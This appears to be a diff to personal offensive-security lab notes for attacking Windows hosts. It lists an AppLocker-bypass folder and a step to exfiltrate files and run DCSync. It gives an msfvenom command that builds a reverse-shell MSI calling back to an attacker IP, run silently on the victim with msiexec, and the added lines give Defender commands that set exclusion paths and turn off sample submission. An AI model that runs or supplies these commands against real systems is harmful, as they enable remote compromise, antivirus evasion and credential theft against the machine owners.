@@ -27,3 +27,7 @@ c:\windows\system32\spool\drivers\color\     (folder that bypasses applocker)
 #5 exfiltrate the files and perform dcsync locally
 
 msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.4 LPORT=1339 -f msi > pwn.msi (abuse with msiexec /q /i pwn.msi in victim machine)
+
+Add-MpPreference -ExclusionPath "C:\Temp"  (add exclusion path)
+Remove-MpPreference -ExclusionPath "C:\Temp"
+PowerShell Set-MpPreference -SubmitSamplesConsent 2 (disable automatic send samples for labs etc)
